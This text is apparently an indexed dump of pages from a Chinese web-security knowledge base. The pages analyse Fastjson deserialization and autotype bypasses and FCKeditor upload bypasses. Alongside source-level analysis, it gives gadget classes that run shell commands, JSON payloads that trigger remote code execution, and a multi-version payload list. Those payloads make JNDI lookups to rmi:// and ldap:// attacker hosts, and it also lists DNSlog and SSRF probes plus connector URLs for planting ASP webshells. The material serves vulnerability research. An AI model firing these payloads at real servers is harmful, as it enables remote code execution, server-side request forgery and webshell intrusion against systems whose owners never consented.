可以看到，使用了loader.defineClass()方法用于加载_bytecodes的内容，并将返回的类赋值给_class[i]（这里的i是0）。loader是TemplatesImpl自定义的类，跟进一下： 可以看到TransletClassLoader继承了Java类加载器---ClassLoader类，跟进其defineClass方法，发现直接调用了父类ClassLoader中的方法，所以就不再跟进了。 回到defineTransletClasses方法，其间接调用ClassLoader加载_bytecodes中的内容之后，将加载出来的类赋值给_class[0]，然后结束，回到getTransletInstance方法，再看一下图： 可以看到，455行直接使用了_class[0].newInstance()创建实例，创建的过程中调用了evilClass1构造方法，然后触发了payload： 0x03 复现过程 从github上直接pull下poc：https://github.com/ianxtianxt/fastjson-remote-code-execute-poc 使用idea打开工程，编译test.java： 然后会在target/classes/person下生成test.class文件。用同样的方法编译Poc.java。 配置运行方式 image 运行Poc： 参考链接 https://www.cnblogs.com/litlife/p/9986427.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:52:50 "},"Web安全/Fastjson/Fastjson 1.2.68 bypass autotype/Fastjson 1.2.68 bypass autotype.html":{"url":"Web安全/Fastjson/Fastjson 1.2.68 bypass autotype/Fastjson 1.2.68 bypass autotype.html","title":"Fastjson 1.2.68 bypass autotype","keywords":"","body":"基于期望类的特性 分析 com.alibaba.fastjson.parser.ParserConfig#checkAutoType(String typeName, Class expectClass, int features)方法有三个参数分别是 typeName 被序列化的类名 expectClass 期望类 features值 具体看下校验过程 首先判断非空和安全模式以及typename长度来决定是否进行autotype。 if (typeName == null) { return null; } if (autoTypeCheckHandlers != null) { for (AutoTypeCheckHandler h : autoTypeCheckHandlers) { Class type = h.handler(typeName, expectClass, features); if (type != null) { return type; } } } final int safeModeMask = Feature.SafeMode.mask; boolean safeMode = this.safeMode || (features & safeModeMask) != 0 || (JSON.DEFAULT_PARSER_FEATURE & safeModeMask) != 0; if (safeMode) { throw new JSONException(\"safeMode not support autoType : \" + typeName); } if (typeName.length() >= 192 || typeName.length() 然后判断期望类 final boolean expectClassFlag; if (expectClass == null) { expectClassFlag = false; } else { if (expectClass == Object.class || expectClass == Serializable.class || expectClass == Cloneable.class || expectClass == Closeable.class || expectClass == EventListener.class || expectClass == Iterable.class || expectClass == Collection.class ) { expectClassFlag = false; } else { expectClassFlag = true; } } Object、Serializable、Cloneable、Closeable、EventListener、Iterable、Collection这几个类不能作为expectClass期望类。 然后计算hash进行内部白名单、黑名单匹配 String className = typeName.replace('$', '.'); Class clazz; final long BASIC = 0xcbf29ce484222325L; final long PRIME = 0x100000001b3L; final long h1 = (BASIC ^ className.charAt(0)) * PRIME; if (h1 == 0xaf64164c86024f1aL) { // [ throw new JSONException(\"autoType is not support. \" + typeName); } if ((h1 ^ className.charAt(className.length() - 1)) * PRIME == 0x9198507b5af98f0L) { throw new JSONException(\"autoType is not support. \" + typeName); } final long h3 = (((((BASIC ^ className.charAt(0)) * PRIME) ^ className.charAt(1)) * PRIME) ^ className.charAt(2)) * PRIME; long fullHash = TypeUtils.fnv1a_64(className); boolean internalWhite = Arrays.binarySearch(INTERNAL_WHITELIST_HASHCODES, fullHash) >= 0; if (internalDenyHashCodes != null) { long hash = h3; for (int i = 3; i = 0) { throw new JSONException(\"autoType is not support. \" + typeName); } } } if ((!internalWhite) && (autoTypeSupport || expectClassFlag)) { long hash = h3; for (int i = 3; i = 0) { clazz = TypeUtils.loadClass(typeName, defaultClassLoader, true); if (clazz != null) { return clazz; } } if (Arrays.binarySearch(denyHashCodes, hash) >= 0 && TypeUtils.getClassFromMapping(typeName) == null) { if (Arrays.binarySearch(acceptHashCodes, fullHash) >= 0) { continue; } throw new JSONException(\"autoType is not support. \" + typeName); } } } 如果(!internalWhite) && (autoTypeSupport || expectClassFlag)不在内部白名单中并且开启autoTypeSupport或者有期望类时，进行hash校验白名单acceptHashCodes、黑名单denyHashCodes，在白名单内就加载，在黑名单中就抛出异常。继续 clazz = TypeUtils.getClassFromMapping(typeName); if (clazz == null) { clazz = deserializers.findClass(typeName); } if (clazz == null) { clazz = typeMapping.get(typeName); } if (internalWhite) { clazz = TypeUtils.loadClass(typeName, defaultClassLoader, true); } if (clazz != null) { if (expectClass != null && clazz != java.util.HashMap.class && !expectClass.isAssignableFrom(clazz)) { throw new JSONException(\"type not match. \" + typeName + \" -> \" + expectClass.getName()); } return clazz; } 分别从getClassFromMapping、deserializers.findClass、typeMapping、internalWhite内部白名单中查找类，如果开启了expectClass期望类还要判断类型是否一致。 getClassFromMapping在com.alibaba.fastjson.util.TypeUtils#addBaseClassMappings被赋值，添加了一些基本类，后续会当作缓存使用。 这里先注意下java.lang.AutoCloseable类。 deserializers.findClass是在com.alibaba.fastjson.parser.ParserConfig#initDeserializers初始化。 也是存放了一些特殊类用来直接反序列化。 typeMapping默认为空需要开发自己赋值，形如 ParserConfig.getGlobalInstance().register(\"test\", Model.class); internalWhite内部白名单就不说了，到这里已经可以返回类了，通过java.net.Inet6Address、java.net.URL等来判断fastjson也是这个原理。 然后继续走就到了autoTypeSupport的校验。 if (!autoTypeSupport) { long hash = h3; for (int i = 3; i = 0) { throw new JSONException(\"autoType is not support. \" + typeName); } // white list if (Arrays.binarySearch(acceptHashCodes, hash) >= 0) { clazz = TypeUtils.loadClass(typeName, defaultClassLoader, true); if (expectClass != null && expectClass.isAssignableFrom(clazz)) { throw new JSONException(\"type not match. \" + typeName + \" -> \" + expectClass.getName()); } return clazz; } } } 黑白名单匹配。 继续判断使用注解JSONType的类 boolean jsonType = false; InputStream is = null; try { String resource = typeName.replace('.', '/') + \".class\"; if (defaultClassLoader != null) { is = defaultClassLoader.getResourceAsStream(resource); } else { is = ParserConfig.class.getClassLoader().getResourceAsStream(resource); } if (is != null) { ClassReader classReader = new ClassReader(is, true); TypeCollector visitor = new TypeCollector(\"\", new Class[0]); classReader.accept(visitor); jsonType = visitor.hasJsonType(); } } catch (Exception e) { // skip } finally { IOUtils.close(is); } 继续 final int mask = Feature.SupportAutoType.mask; boolean autoTypeSupport = this.autoTypeSupport || (features & mask) != 0 || (JSON.DEFAULT_PARSER_FEATURE & mask) != 0; if (autoTypeSupport || jsonType || expectClassFlag) { boolean cacheClass = autoTypeSupport || jsonType; clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass); } if (clazz != null) { if (jsonType) { TypeUtils.addMapping(typeName, clazz); return clazz; } if (ClassLoader.class.isAssignableFrom(clazz) // classloader is danger || javax.sql.DataSource.class.isAssignableFrom(clazz) // dataSource can load jdbc driver || javax.sql.RowSet.class.isAssignableFrom(clazz) // ) { throw new JSONException(\"autoType is not support. \" + typeName); } if (expectClass != null) { if (expectClass.isAssignableFrom(clazz)) { TypeUtils.addMapping(typeName, clazz); return clazz; } else { throw new JSONException(\"type not match. \" + typeName + \" -> \" + expectClass.getName()); } } JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, clazz, propertyNamingStrategy); if (beanInfo.creatorConstructor != null && autoTypeSupport) { throw new JSONException(\"autoType is not support. \" + typeName); } } 如果有注解，则加入mapping缓存并直接返回。如果没有注解判断clazz类是否继承或实现classloader、dataSource、RowSet，抛出异常防止jndi注入。 如果expectClass期望类不为空，则需要加载的类是期望类的子类或实现，并直接返回，否则异常。 如果类使用JSONCreator注解并且开启autoTypeSupport，抛出异常。 最后就是判断是否开启autoTypeSupport特性，将clazz添加进缓存，并且return clazz。 if (!autoTypeSupport) { throw new JSONException(\"autoType is not support. \" + typeName); } if (clazz != null) { TypeUtils.addMapping(typeName, clazz); } 可以看到主要有如下种情况可以直接返回class TypeUtils.mappings mappings缓存1.2.47中就被绕过了一次autotype。而这次绕过是在于exceptClass期望类这个功能。 期望类的功能主要是实现/继承了期望类的class能被反序列化出来（并且不受autotype影响），寻找checkAutoType方法的调用，要求exceptClass不为空。 只有两个类JavaBeanDeserializer、ThrowableDeserializer中调用了checkAutoType并且exceptClass不为空。 在com/alibaba/fastjson/parser/ParserConfig.java:826中对一些基本的类型设置了对应的反序列化实例deserializer ThrowableDeserializer是Throwable用来反序列化异常类的，当没有命中之前程序给定的类型时会进入createJavaBeanDeserializer()，其实就是JavaBeanDeserializer。 先看ThrowableDeserializer中 根据第二个@type获取类，并且传入指定期望类进行加载。因此可以反序列化继承Throwable的异常类，借助setter、getter等方法的自动调用，来挖掘gadget。浅蓝师傅给了一个gadget package org.chabug.fastjson.exploit; import java.io.IOException; public class ExecException extends Exception { private String domain; public ExecException() { super(); } public String getDomain() { return domain; } public void setDomain(String domain) { this.domain = domain; } @Override public String getMessage() { try { Runtime.getRuntime().exec(new String[]{\"cmd\", \"/c\", \"ping \" + domain}); } catch (IOException e) { return e.getMessage(); } return super.getMessage(); } } 提交json触发rce { \"@type\":\"java.lang.Exception\", \"@type\": \"org.chabug.fastjson.exploit.ExecException\", \"domain\": \"y4er.com | calc\" } 当然很少有开发者把命令执行写道异常类处理中，所以Throwable鸡肋。 再来看JavaBeanDeserializer，在fastjson中对大部分类都指定了特定的deserializer，而AutoCloseable类没有，通过继承/实现AutoCloseable的类可以绕过autotype反序列化。场景如下： package org.chabug.fastjson.exploit; import java.io.Closeable; import java.io.IOException; public class ExecCloseable implements Closeable { private String domain; public ExecCloseable() { } public ExecCloseable(String domain) { this.domain = domain; } public String getDomain() { try { Runtime.getRuntime().exec(new String[]{\"cmd\", \"/c\", \"ping \" + domain}); } catch (IOException e) { e.printStackTrace(); } return domain; } public void setDomain(String domain) { this.domain = domain; } @Override public void close() throws IOException { } } 提交json触发rce { \"@type\":\"java.lang.AutoCloseable\", \"@type\": \"org.chabug.fastjson.exploit.ExecCloseable\", \"domain\": \"y4er.com | calc\" } fastjson在黑名单中还加上了java.lang.Runnable、java.lang.Readable，这个利用场景拿Runnable举个例子 package org.chabug.fastjson.exploit; import java.io.IOException; public class ExecRunnable implements AutoCloseable { private EvalRunnable eval; public EvalRunnable getEval() { return eval; } public void setEval(EvalRunnable eval) { this.eval = eval; } @Override public void close() throws Exception { } } class EvalRunnable implements Runnable { private String cmd; public String getCmd() { System.out.println(\"EvalRunnable getCmd() \"+cmd); try { Runtime.getRuntime().exec(new String[]{\"cmd\",\"/c\",cmd}); } catch (IOException e) { e.printStackTrace(); } return cmd; } public void setCmd(String cmd) { this.cmd = cmd; } @Override public void run() { } } { \"@type\":\"java.lang.AutoCloseable\", \"@type\": \"org.chabug.fastjson.exploit.ExecRunnable\", \"eval\":{\"@type\":\"org.chabug.fastjson.exploit.EvalRunnable\",\"cmd\":\"calc\"} } Readable同理。 拓展使用$ref拓展攻击面，使用parse()解析的也能触发任意getter。这个payload来自 @threedr3am package org.chabug.fastjson.exploit; import com.alibaba.fastjson.JSON; import org.apache.shiro.jndi.JndiLocator; import org.apache.shiro.util.Factory; import javax.naming.NamingException; public class RefAnyGetterInvoke extends JndiLocator implements Factory, AutoCloseable { private String resourceName; public RefAnyGetterInvoke() { } public static void main(String[] args) { String json = \"{\\n\" + \" \\\"@type\\\":\\\"java.lang.AutoCloseable\\\",\\n\" + \" \\\"@type\\\": \\\"org.chabug.fastjson.exploit.RefAnyGetterInvoke\\\",\\n\" + \" \\\"resourceName\\\": \\\"ldap://localhost:1389/Calc\\\",\\n\" + \" \\\"instance\\\": {\\n\" + \" \\\"$ref\\\": \\\"$.instance\\\"\\n\" + \" }\\n\" + \"}\"; System.out.println(json); JSON.parse(json); // 默认不会调用getter 使用$ref就可以调用到getInstance() // JSON.parseObject(json); // parseObject默认就会调用getter getInstance() } public T getInstance() { System.out.println(getClass().getName() + \".getInstance() invoke.\"); try { return (T) this.lookup(thisresourceName); } catch (NamingException var3) { throw new IllegalStateException(\"Unable to look up with jndi name '\" + thisresourceName + \"'.\", var3); } } public String getResourceName() { System.out.println(getClass().getName() + \".getResourceName() invoke.\"); return thisresourceName; } public void setResourceName(String resourceName) { System.out.println(getClass().getName() + \".setResourceName() invoke.\"); thisresourceName = resourceName; } @Override public void close() throws Exception { } } gadget if (ClassLoader.class.isAssignableFrom(clazz) // classloader is danger || javax.sql.DataSource.class.isAssignableFrom(clazz) // dataSource can load jdbc driver || javax.sql.RowSet.class.isAssignableFrom(clazz) // ) { throw new JSONException(\"autoType is not support. \" + typeName); } 因为这几行代码的限制，大部分的JNDI gadget都不能用了，需要找到一条基于AutoCloseable的新gadget。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:52:53 "},"Web安全/Fastjson/Fastjson 1.2.68 最新版本有限制 autotype bypass/Fastjson 1.2.68 最新版本有限制 autotype bypass.html":{"url":"Web安全/Fastjson/Fastjson 1.2.68 最新版本有限制 autotype bypass/Fastjson 1.2.68 最新版本有限制 autotype bypass.html","title":"Fastjson 1.2.68 最新版本有限制 autotype bypass","keywords":"","body":"Fastjson 1.2.68 最新版本有限制 autotype bypass 一、漏洞简介 该漏洞和以往的 autotype bypass 不同，要求 gadget 必须继承自 Throwable 异常类，所以常见的 JNDI gadget 就无法在此处使用。 所以只能找在异常类中的构造方法、set方法、get方法、toString等方法内的敏感操作才会触发漏洞。 由于异常类中很少使用高危函数，所以我目前还没有找到可以 RCE 的 gadget，只找到了几个非 RCE 的 gadget。 二、漏洞影响 Fastjson 1.2.68 三、复现过程 反序列化时如果遇到 \\@type 指定的类为 Throwable 的子类那对应的反序列化处理类就是 ThrowableDeserializer 1.jpg 漏洞点在 ThrowableDeserializer#deserialze 2.jpg 当第二个字段的 key 也是 \\@type 的时候就会取 value 当做类名做一次 checkAutoType 检测。 调用 ParserConfig#checkAutoType 时注意第二个参数，它指定了第二个参数 expectClass 为 Throwable.class 类对象，通常情况下这个参数都是 null。 checkAutoType 一般有以下几种情况会通过校验。 白名单里的类 开启了 autotype 使用了 JSONType 注解 指定了期望类（expectClass） 缓存 mapping 中的类 1.2.68 又更新了一个使用了 ParserConfig.AutoTypeCheckHandler 接口通过校验的类。 这个漏洞实际上就是基于第四种，指定了期望类的情况。 3.jpg 这里判断了如果期望类不为空且反序列化目标类继承自期望类就会添加到缓存 mapping 并且返回这个 class。 4.jpg autotype 检测通过后就会开始实例化异常类对象。 同时把 message 和 cause 传给了 ThrowableDeserializer#createException 处理。 5.jpg 依次按照以下顺序进行实例化构造方法参数1类型为String.class且参数2类型为Throwable.class，如果找不到就按照参数1类型为String.class，还找不到就取无参构造方法。 6.jpg 最后为被实例化后的异常类装配属性。 遍历 otherValues ，按照 key 去调用异常类的 set 方法，otherValue 是当前 jsonobject 对象中除了 \\@type、message、cause、stackTrace 以外的其他字段。 例如 \\@type 的类是 java.lang.Exception，otherValues 的第一条是 \\\"msg\\\"=>\\\"hello\\\"。 那么这里就会先去实例化 Exception 对象，再去调用 exception.setMsg(\\\"hello\\\") 这里就是 set 触发的地方，而get方法则会在 JSON 转 JSONObject 的时候会调用该异常类的所有 get 方法。 也可以通过 $ref 字段借助 JSONPath 去访问 get 方法，关于 JSONPath ，我在博客中的另一篇\"fastjson 1.2.62 拒绝服务漏洞\"文章中有提到过。 问题分析完了，下面就是如何去寻找合适的 gadget 触发漏洞了。 我自己先写一个存在问题的异常类，去验证一下问题。 public class PingException extends Exception { private String domain; public PingException() { super(); } public String getDomain() { return domain; } public void setDomain(String domain) { this.domain = domain; } @Override public String getMessage() { try { Runtime.getRuntime().exec(\"cmd /c ping \"+domain); } catch (IOException e) { return e.getMessage(); } return super.getMessage(); } } 复制 构造的 JSON 如下 {\"@type\":\"java.lang.Throwable\", \"@type\":\"PingException\",\"domain\":\"b1ue.cn&&calc\"} 7.jpg 当然这只是用来测试的，真实情况很少有人把执行命令的方法写进异常类。 不过我找到了 selenium 的一个敏感信息泄露，selenium 一般用来操控浏览器进行爬虫，在很多基于浏览器操作的爬虫项目里都会使用到 selenium，如果同时也使用了 fastjson ，就会存在敏感信息泄露的问题。 org.openqa.selenium.WebDriverException 会输出这些信息主机IP、主机名、系统名、系统架构、操作系统版本、java版本、Selenium版本、webdriver驱动版本等等一系列信息。 同时由于是异常类，父类的 getStackTrace() 也会被调用，会输出当前方法栈信息，可从中看出使用了什么框架。 8.jpg 这是反序列化org.openqa.selenium.WebDriverException类输出的信息。 漏洞复现 poc {\"content\":{\"$ref\":\"$x.systemInformation\"}, \"x\": {\"@type\":\"java.lang.Exception\",\"@type\":\"org.openqa.selenium.WebDriverException\"}} QQ截图20200528144437.png 还可以看到一些方法栈信息，看到一些服务端使用的框架的信息。 当然这个前提是需要WEB应用的classpath存在selenium-api。 作者提出还有一个思路可以SSRF(当然也需要相应的classpath)： 从mvn引入，或者自己写一个类： package org.joychou; import javax.activation.DataSource; import javax.activation.URLDataSource; import java.net.URL; public class DatasourceException extends Exception { public DatasourceException() { } private DataSource dataSource; public DataSource getDataSource() { return dataSource; } public void setDataSource(URL url) { this.dataSource = new URLDataSource(url); } } 2.png poc {\"@type\":\"java.lang.Exception\",\"@type\":\"org.joychou.DatasourceException\", \"dataSource\": {\"@type\": \"java.net.URL\", \"val\": \"http://www.0-sec.org:8888/fastjson\"}} 3.png 参考了链接 https://b1ue.cn/archives/348.html https://blog.csdn.net/caiqiiqi/article/details/106050079 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:52:54 "},"Web安全/Fastjson/Fastjson 多版本payload集合/Fastjson 多版本payload集合.html":{"url":"Web安全/Fastjson/Fastjson 多版本payload集合/Fastjson 多版本payload集合.html","title":"Fastjson 多版本payload集合","keywords":"","body":"Fastjson 多版本payload集合 影响版本： fastjson exp： {\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://x.x.x.x:1099/jndi\", \"autoCommit\":true} 影响版本： fastjson 前提： autoTypeSupport属性为true才能使用。（fastjson>=1.2.25默认为false） exp： {\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://x.x.x.x:1098/jndi\", \"autoCommit\":true} 影响版本： fastjson 前提： autoTypeSupport属性为true才能使用。（fastjson>=1.2.25默认为false） exp： {\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"ldap://localhost:1399/Exploit\", \"autoCommit\":true} 影响版本： fastjson 前提： autoTypeSupport属性为true才能使用。（fastjson>=1.2.25默认为false） exp： {\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{,\"dataSourceName\":\"ldap://localhost:1399/Exploit\", \"autoCommit\":true} 影响版本： fastjson 前提： autoTypeSupport属性为true才能使用。（fastjson>=1.2.25默认为false） exp： {\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"ldap://localhost:1399/Exploit\"}} 影响版本： fastjson exp： { \"a\": { \"@type\": \"java.lang.Class\", \"val\": \"com.sun.rowset.JdbcRowSetImpl\" }, \"b\": { \"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\": \"ldap://x.x.x.x:1999/Exploit\", \"autoCommit\": true } } 影响版本： fastjson exp： {\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"AsText\":\"rmi://127.0.0.1:1098/exploit\"}\" 影响版本： fastjson 前提： autoTypeSupport属性为true才能使用。（fastjson>=1.2.25默认为false） exp： {\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://192.168.80.1:1389/Calc\"} {\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"metricRegistry\":\"ldap://192.168.80.1:1389/Calc\"} {\"@type\":\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\",\"jndiNames\":\"ldap://192.168.80.1:1389/Calc\"} {\"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\",\"properties\": { Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:52:55 "},"Web安全/Fastjson/通过Dnslog判断是否使用fastjson/通过Dnslog判断是否使用fastjson.html":{"url":"Web安全/Fastjson/通过Dnslog判断是否使用fastjson/通过Dnslog判断是否使用fastjson.html","title":"通过Dnslog判断是否使用fastjson","keywords":"","body":"通过Dnslog判断是否使用fastjson 方法一：利用java.net.Inet [4 | 6]地址 很早之前有一个方法是使用java.net.InetAddress类，现在这个类已经列入黑名单。而在翻阅fastjson最新版源码（v1.2.67）时，发现两个类没有在黑名单中，于是可以构造了如下有效载荷，可以使fastjson进行DNS解析。下面以java.net.Inet4Address为例分析构造原理。 {\"@type\":\"java.net.Inet4Address\",\"val\":\"dnslog\"} {\"@type\":\"java.net.Inet6Address\",\"val\":\"dnslog\"} 我们知道在fastjson在反序列化之前都会调用checkAutoType方法对类进行检查。通过调试发现，由于java.net.Inet4Address不在黑名单中，所以就算开启AutoType也是能过1处的检查。 fastjson的ParserConfig类自己维护了一个IdentityHashMap，在这个HashMap中的类会被认为是安全的。在2处可以在IdentityHashMap中可以获取到java.net.Inet4Address，所以clazz不为null，导致在3处就返回了。跳过了后续的未开启AutoType的黑名单检查。所以可以发现无论AutoType是否开启，都可以过checkAutoType的检查 //com.alibaba.fastjson.parser.ParserConfig#checkAutoType public Class checkAutoType(String typeName, Class expectClass, int features) { ... Class clazz; // 1.当打开了autoTypeSupport,类名又不在白名单时进行的黑名单检查 if (!internalWhite && (this.autoTypeSupport || expectClassFlag)) { hash = h3; for(mask = 3; mask = 0 && TypeUtils.getClassFromMapping(typeName) == null && Arrays.binarySearch(this.acceptHashCodes, fullHash) \" + expectClass.getName()); } else { // 3. 直接返回，不再走下面的autoTypeSupport和黑名单检查 return clazz; } } else { // 4. 不开启autoType时，进行的黑名单检查 if (!this.autoTypeSupport) { hash = h3; for(mask = 3; mask = 0) { throw new JSONException(\"autoType is not support. \" + typeName); } ... } } } ... } fastjason对于Inet4Address类会使用MiscCodec这个ObjectDeserializer来反序列化。跟进发现解析器会取回val变量的值赋值给strVal变量，由于我们的类是Inet4Address，所以它们会执行到1处，进行域名解析。 //com.alibaba.fastjson.serializer.MiscCodec#deserialze public T deserialze（DefaultJSONParser parser，Type clazz，Object fieldName）{ ... objVal = parser.parse（）; ... strVal =（String）objVal; if（strVal！= null && strVal.length（）！= 0）{ if（clazz == UUID.class）{ ... } else if（clazz == URI.class）{ ... } else if（clazz == URL.class）{ ... } else if（clazz == Pattern.class）{ ... } else if（clazz == Locale.class）{ ... } else if（clazz == SimpleDateFormat.class）{ ... } else if（clazz！= InetAddress.class && clazz！= Inet4Address.class && clazz！= Inet6Address.class）{ ... } else { 试试{ / / 1.将strVal作为主机名，获取其对应的IP，域名在此处被解析 返回InetAddress.getByName（strVal）; } catch（UnknownHostException var11）{ 抛出新的JSONException（“反序列化inet地址错误”，var11）; } } }其他{ 返回null; } } 方法二：利用java.net.InetSocketAddress java.net.InetSocketAddress类也在IdentityHashMap中，和上面一样无视checkAutoType检查。 通过它要走到InetAddress.getByName()流程计量方法一是要绕过一些路的。刚开始一直没构造出来，后来在和实验室的@背影师傅交流时，才知道可以顺着解析器规则构造（它要啥就给它啥），最终有效载荷如下，当然它是畸形的json。 {\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"dnslog\"}} 那这个是怎样构造出来的呢？这需要简单了解下fastjson的词法分析器了，这里就不展开了。这里尤为关键的是解析器token值对应的含义，可以在com.alibaba.fastjson.parser.JSONToken类中看到它们。 //com.alibaba.fastjson.parser.JSONToken public class JSONToken { ... public static String name(int value) { switch(value) { case 1: return \"error\"; case 2: return \"int\"; case 3: return \"float\"; case 4: return \"string\"; case 5: return \"iso8601\"; case 6: return \"true\"; case 7: return \"false\"; case 8: return \"null\"; case 9: return \"new\"; case 10: return \"(\"; case 11: return \")\"; case 12: return \"{\"; case 13: return \"}\"; case 14: return \"[\"; case 15: return \"]\"; case 16: return \",\"; case 17: return \":\"; case 18: return \"ident\"; case 19: return \"fieldName\"; case 20: return \"EOF\"; case 21: return \"Set\"; case 22: return \"TreeSet\"; case 23: return \"undefined\"; case 24: return \";\"; case 25: return \".\"; case 26: return \"hex\"; default: return \"Unknown\"; } } } 构造这个payload需要分两步，第一步我们需要让代码执行到1处，这一路解析器要接收的字符在代码已经标好。按照顺序写就是{\"@type\":\"java.net.InetSocketAddress\"{\"address\": //com.alibaba.fastjson.serializer.MiscCodec#deserialze public T deserialze(DefaultJSONParser parser, Type clazz, Object fieldName) { JSONLexer lexer = parser.lexer; String className; if (clazz == InetSocketAddress.class) { if (lexer.token() == 8) { lexer.nextToken(); return null; } else { // 12 ---> { parser.accept(12); InetAddress address = null; int port = 0; while(true) { className = lexer.stringVal(); lexer.nextToken(17); // 字段名需要为address if (className.equals(\"address\")) { // 17 ---> : parser.accept(17); // 1. 我们需要让解析器走到这里 address = (InetAddress)parser.parseObject(InetAddress.class); } ... } } } ... } parser.parseObject(InetAddress.class)最终依然会，调用MiscCodec#deserialze()方法来序列化，这里就来到了我们构造payload的第二步。第二步的目标是要让解析器走到InetAddress.getByName(strVal)。解析器要接受的字符在代码里标好了，并按顺序写就是,\"val\":\"http://dnslog\"}。 //com.alibaba.fastjson.serializer.MiscCodec#deserialze public T deserialze(DefaultJSONParser parser, Type clazz, Object fieldName) { JSONLexer lexer = parser.lexer; String className; // 序列化的是InetAddress.class类，走else流程 if (clazz == InetSocketAddress.class) { ... } else { Object objVal; if (parser.resolveStatus == 2) { parser.resolveStatus = 0; // 16 ---> , parser.accept(16); if (lexer.token() != 4) { throw new JSONException(\"syntax error\"); } // 字段名 ---> val if (!\"val\".equals(lexer.stringVal())) { throw new JSONException(\"syntax error\"); } lexer.nextToken(); // 17 ---> : parser.accept(17); // 之后解析为对象,也就是val字段对应的值 objVal = parser.parse(); // 13 ---> } parser.accept(13); } .... // 后续的流程和方法一一样了，进行类型判断 strVal = (String)objVal; if (strVal != null && strVal.length() != 0) { if (clazz == UUID.class) { ... } else if (clazz == URI.class) { ... } else if (clazz == URL.class) { ... } else if (clazz != InetAddress.class && clazz != Inet4Address.class && clazz != Inet6Address.class) { ... } else { try { // 域名解析 return InetAddress.getByName(strVal); } catch (UnknownHostException var11) { throw new JSONException(\"deserialize inet adress error\", var11); } } } } 两段合起来就得到了最终的有效载荷。 方法三：利用java.net.URL java.net.URL类也在IdentityHashMap中，和上面一样无视checkAutoType检查。 {{“ @type”：“ java.net.URL”，“ val”：“ http：// dnslog”}：“ x”} 来源于@retanoj状语从句：@threedr3am两位师傅的启发，其原理和ysoserial的中URLDNS这个小工具的原理一样。 简单来说就是向HashMap压入一个键值对时，HashMap需要获取键对象的哈希码。当键对象是一个URL对象时，在获取它的hashcode期间会调用getHostAddress方法获取主机，这个过程域名会被解析。 2 1.png URL对象hashcode的获取过程 fastjson解析上述payload时，先反序列化出URL(http://dnslog)对象，然后将{URL(http://dnslog):\"x\"}解析为一个HashMap，域名被解析。 @retanoj在问题中还构造了好几个畸形的有效载荷，虽然原理都是一样的，但还是挺有意思的，意识到了师傅对fastjson词法分析器透彻的理解。 {\"@type\":\"com.alibaba.fastjson.JSONObject\", {\"@type\": \"java.net.URL\", \"val\":\"http://dnslog\"}}\"\"} Set[{\"@type\":\"java.net.URL\",\"val\":\"http://dnslog\"}] Set[{\"@type\":\"java.net.URL\",\"val\":\"http://dnslog\"} {{\"@type\":\"java.net.URL\",\"val\":\"http://dnslog\"}:0 参考链接 https://www.adminxe.com/1037.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:52:55 "},"Web安全/FCKeditor/一、查看FCKeditor版本/一、查看FCKeditor版本.html":{"url":"Web安全/FCKeditor/一、查看FCKeditor版本/一、查看FCKeditor版本.html","title":"一、查看FCKeditor版本","keywords":"","body":"1.查看FCKeditor版本 一、漏洞简介 1.查看FCKeditor版本 二、影响范围 三、复现过程 http://127.0.0.1/fckeditor/editor/dialog/fck_about.html http://127.0.0.1/FCKeditor/_whatsnew.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:52:56 "},"Web安全/FCKeditor/三、FCKeditor 突破上传/三、FCKeditor 突破上传.html":{"url":"Web安全/FCKeditor/三、FCKeditor 突破上传/三、FCKeditor 突破上传.html","title":"三、FCKeditor 突破上传","keywords":"","body":"上传限制 上传限制的突破方式很多，主要还是抓包改扩展名，%00截断，添加文件头等 文件名限制 二次上传绕过 文件名' . ' 修改为' _ ' FCK在上传了诸如shell.asp;.jpg的文件后，会自动将文件名改为shell_asp;.jpg。可以继续上传同名文件，文件名会变为shell.asp;(1).jpg 提交shell.php+空格绕过 提交shell.php+空格绕过 空格只支持windows系统，linux系统是不支持的，可提交shell.php+空格来绕过文件名限制。 iis6.0突破文件夹限制 Fckeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=File&CurrentFolder=/shell.asp&NewFolderName=z.asp FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=Image&CurrentFolder=/shell.asp&NewFolderName=z&uuid=1244789975684 FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=CreateFolder&CurrentFolder=/&Type=Image&NewFolderName=shell.asp 文件解析限制 通过Fckeditor编辑器在文件上传页面中，创建诸如1.asp文件夹，然后再到该文件夹下上传一个图片的webshell文件，获取其shell。 http://www.0-sec.org/images/upload/201806/image/1.asp/1.jpg Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:52:56 "},"Web安全/FCKeditor/二、测试FCKeditor上传点/二、测试FCKeditor上传点.html":{"url":"Web安全/FCKeditor/二、测试FCKeditor上传点/二、测试FCKeditor上传点.html","title":"二、测试FCKeditor上传点","keywords":"","body":"2.测试FCKeditor上传点 一、漏洞简介 二、影响范围 三、复现过程 FCKeditor/editor/filemanager/browser/default/connectors/test.html FCKeditor/editor/filemanager/upload/test.html FCKeditor/editor/filemanager/connectors/test.html FCKeditor/editor/filemanager/connectors/uploadtest.html FCKeditor/_samples/default.html FCKeditor/_samples/asp/sample01.asp FCKeditor/_samples/asp/sample02.asp 